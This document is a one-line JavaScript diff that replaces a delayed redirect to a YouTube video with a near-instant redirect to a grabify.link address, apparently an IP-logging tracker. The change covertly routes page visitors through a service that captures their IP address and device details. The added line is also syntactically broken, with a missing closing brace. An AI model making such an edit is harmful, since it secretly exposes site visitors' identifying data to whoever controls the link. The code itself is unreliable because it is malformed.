@@ -1,1 +1,1 @@
-setTimeout(function(){window.location = "https://www.youtube.com/watch?v=Q2u8rjsK4zY";}, 500)
+setTimeout(function(){window.location = "https://grabify.link/7WBCCN", 1)
